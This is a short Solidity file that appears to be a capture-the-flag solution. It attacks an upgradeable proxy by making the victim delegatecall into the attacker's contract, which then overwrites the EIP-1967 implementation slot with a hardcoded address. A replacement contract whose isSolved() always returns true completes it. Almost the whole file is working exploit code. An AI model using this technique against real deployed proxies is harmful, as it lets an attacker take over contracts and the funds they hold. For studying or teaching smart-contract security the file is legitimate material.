// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract proxy {

     
    struct AddressSlot {
        address value;
    }

    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {
        assembly {
            r.slot := slot
        }
    }

    //call proxy to delegatecall to this contract
    function attack(address _victim) external {

        bytes memory signature = abi.encodeWithSelector(bytes4(keccak256("execute(address)")), address(this));
        (bool success, ) = _victim.call(signature);

        require(success, "Fail");

    }

    //When the proxy uses delegatecall to invoke this contract, it updates the implementation slot to the address of newImplementation
    function exec() external {

        bytes32 _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
        _getAddressSlot(_IMPLEMENTATION_SLOT).value = address(0x62F0C5a441B99ffBeD3c7A169C53dd0162202805);
    }
}

contract newImplementation {

    address public owner;
    address public player;

    function isSolved() external pure returns (bool) {
        return true;
    }
}